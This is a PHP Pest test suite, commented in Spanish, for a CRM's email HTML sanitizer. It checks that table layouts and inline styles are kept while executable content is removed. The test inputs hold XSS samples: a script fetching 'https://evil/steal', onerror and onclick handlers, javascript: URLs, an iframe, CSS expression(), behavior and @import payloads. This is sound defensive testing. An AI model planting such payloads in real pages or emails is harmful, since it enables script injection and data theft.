<?php

declare(strict_types=1);

use App\Models\User;
use Illuminate\Support\Facades\Mail;
use Modules\Core\Tenancy\CurrentInstitution;
use Modules\Crm\Models\Contact;
use Modules\Crm\Models\Lead;
use Modules\Institutions\Models\Institution;
use Modules\Notifications\Mail\OutboundEmail;
use Modules\Notifications\Models\EmailSender;
use Modules\Notifications\Services\EmailDispatcher;
use Modules\Notifications\Support\EmailHtmlSanitizer;

/**
 * Modo CÓDIGO (HTML/CSS). Segunda puerta "email-safe" del sanitizador: se conserva el
 * HTML de DISEÑO legítimo (tablas, estilos inline, colores, botones) pero se sigue
 * NEUTRALIZANDO todo lo ejecutable/peligroso. El HTML entra por el modo código PERO
 * pasa por el MISMO sanitizador antes de guardar y enviar: nadie inyecta script.
 */

// -------------------- (a) DISEÑO LEGÍTIMO: se conserva --------------------

it('conserva HTML de diseño: tabla de maquetación + botón con color + estilos inline', function () {
    $s = new EmailHtmlSanitizer;

    $html = <<<'HTML'
    <table width="600" cellpadding="0" cellspacing="0" bgcolor="#f4f7fb" style="border-collapse:collapse;width:600px">
      <tr>
        <td align="center" style="padding:24px;background-color:#ffffff">
          <h1 style="color:#13253D;font-family:Arial;font-size:22px;margin:0">Bienvenido</h1>
          <p style="color:#61748F;line-height:1.5">Gracias por tu interés.</p>
          <a href="https://mcaschool.education/" style="display:inline-block;background:#1E5AA8;color:#ffffff;padding:12px 22px;border-radius:8px;text-decoration:none;font-weight:600">Ver programas</a>
        </td>
      </tr>
    </table>
    HTML;

    $out = $s->sanitize($html);

    // Estructura de maquetación conservada.
    expect($out)->toContain('<table')->toContain('<tr>')->toContain('<td')
        ->and($out)->toContain('width="600"')
        ->and($out)->toContain('cellpadding="0"')
        ->and($out)->toContain('bgcolor="#f4f7fb"');
    // Estilos inline seguros conservados (color, fondo, padding, radio, tipografía).
    expect($out)->toContain('background: #1E5AA8')
        ->and($out)->toContain('color: #ffffff')
        ->and($out)->toContain('border-radius: 8px')
        ->and($out)->toContain('padding: 12px 22px');
    // El enlace legítimo sobrevive y se endurece.
    expect($out)->toContain('href="https://mcaschool.education/"')
        ->and($out)->toContain('rel="noopener noreferrer"');
});

it('conserva imágenes de banner por https y data:image; descarta http y javascript', function () {
    $s = new EmailHtmlSanitizer;

    $https = $s->sanitize('<img src="https://cdn.mca.education/banner.png" alt="Banner" width="600" style="max-width:100%">');
    expect($https)->toContain('src="https://cdn.mca.education/banner.png"')
        ->and($https)->toContain('width="600"');

    $data = $s->sanitize('<img src="data:image/png;base64,AAAA" alt="x">');
    expect($data)->toContain('data:image/png;base64');

    // http (inseguro/tracking) y javascript: → se quita el src.
    $http = $s->sanitize('<img src="http://evil/track.png">');
    expect($http)->not->toContain('http://evil');
    $js = $s->sanitize('<img src="javascript:alert(1)">');
    expect($js)->not->toContain('javascript:');
});

it('vuelca width/height de la imagen a estilo inline (para no deformarse con el reset img{height:auto})', function () {
    $s = new EmailHtmlSanitizer;

    $out = $s->sanitize('<img src="https://cdn.mca/logo.png" width="250" height="80" alt="logo">');
    expect($out)->toContain('width:250px')->toContain('height:80px');

    // Porcentajes válidos; un estilo explícito del diseño mantiene prioridad (va después).
    expect($s->sanitize('<img src="https://cdn.mca/x.png" width="100%">'))->toContain('width:100%');
    // Valor no numérico en el atributo no se vuelca (no rompe el estilo).
    expect($s->sanitize('<img src="https://cdn.mca/x.png" width="foo">'))->not->toContain('width:foo');
});

// -------------------- (b) MALICIOSO: se neutraliza --------------------

it('neutraliza script, on* (onclick/onerror), javascript: e iframe aunque vengan del modo código', function () {
    $s = new EmailHtmlSanitizer;

    $out = $s->sanitize(<<<'HTML'
    <div style="color:#000">Hola</div>
    <script>fetch('https://evil/steal')</script>
    <a href="javascript:robar()" onclick="robar()" style="color:red">clic</a>
    <img src="x" onerror="alert(1)">
    <iframe src="https://evil"></iframe>
    <button onclick="x()">no</button>
    HTML);

    expect($out)->not->toContain('<script')
        ->and($out)->not->toContain('fetch(')
        ->and($out)->not->toContain('onclick')
        ->and($out)->not->toContain('onerror')
        ->and($out)->not->toContain('javascript:')
        ->and($out)->not->toContain('<iframe')
        ->and($out)->not->toContain('<button');
    // El contenido legítimo de al lado sobrevive.
    expect($out)->toContain('Hola')->toContain('color: #000');
});

it('neutraliza CSS ejecutable en style inline: expression(), behavior, @import, url(javascript:)', function () {
    $s = new EmailHtmlSanitizer;

    // expression() fuera; el resto de propiedades seguras del mismo style se conservan.
    $expr = $s->sanitize('<div style="color:#111;width:expression(alert(1))">x</div>');
    expect($expr)->not->toContain('expression')
        ->and($expr)->toContain('color: #111');

    expect($s->sanitize('<div style="behavior:url(evil.htc)">x</div>'))->not->toContain('behavior');
    expect($s->sanitize('<div style="background:url(javascript:alert(1))">x</div>'))->not->toContain('javascript');
    expect($s->sanitize('<div style="x:y;@import url(http://evil)">x</div>'))->not->toContain('@import');
    // background-image con url http (no https) → declaración descartada.
    expect($s->sanitize('<div style="background-image:url(http://evil/a.png)">x</div>'))->not->toContain('http://evil');
    // propiedad no permitida (no email-safe) se descarta; -mso permitida se conserva.
    $mixed = $s->sanitize('<td style="position:fixed;mso-line-height-rule:exactly;color:#222">x</td>');
    expect($mixed)->not->toContain('position')
        ->and($mixed)->toContain('mso-line-height-rule')
        ->and($mixed)->toContain('color: #222');
});

it('el bloque <style> en head/cuerpo NO se admite (solo estilos inline)', function () {
    $s = new EmailHtmlSanitizer;

    $out = $s->sanitize('<style>.x{color:red}</style><p style="color:green">texto</p>');
    expect($out)->not->toContain('<style')
        ->and($out)->not->toContain('.x{')
        ->and($out)->toContain('color: green');
});

// -------------------- END-TO-END: sobrevive al guardado y envío --------------------

it('un correo de DISEÑO enviado guarda y manda el HTML con tablas/estilos y sin script', function () {
    Mail::fake();
    $institution = Institution::factory()->create();

    [$user, $contact, $lead, $sender] = app(CurrentInstitution::class)->runFor($institution->id, function () use ($institution) {
        return [
            User::factory()->create(['institution_id' => $institution->id, 'role' => 'admin', 'can_email_code' => true]),
            $c = Contact::factory()->create(['email' => 'dest@example.com']),
            Lead::factory()->create(['contact_id' => $c->id]),
            EmailSender::factory()->create(['from_address' => 'finanzas@mcaschool.education', 'name' => 'Finanzas MCA']),
        ];
    });

    $design = '<table width="600" bgcolor="#f4f7fb"><tr><td style="padding:20px;background-color:#fff">'
        .'<a href="https://mcaschool.education/" style="background:#1E5AA8;color:#fff;padding:12px 20px;border-radius:8px">Ver</a>'
        .'</td></tr></table><script>steal()</script>';

    app(CurrentInstitution::class)->runFor($institution->id, function () use ($sender, $contact, $lead, $user, $design) {
        $msg = app(EmailDispatcher::class)->send($sender, $contact, $lead->id, $user, 'Diseño', $design);

        // El cuerpo GUARDADO conserva el diseño y NO trae el script.
        expect($msg->body)->toContain('<table')
            ->and($msg->body)->toContain('bgcolor="#f4f7fb"')
            ->and($msg->body)->toContain('background: #1E5AA8')
            ->and($msg->body)->toContain('href="https://mcaschool.education/"')
            ->and($msg->body)->not->toContain('<script')
            ->and($msg->body)->not->toContain('steal(');
    });

    // Lo MANDADO tampoco lleva script.
    Mail::assertSent(OutboundEmail::class, fn (OutboundEmail $m) => str_contains($m->bodyHtml, '<table') && ! str_contains($m->bodyHtml, '<script'));
});
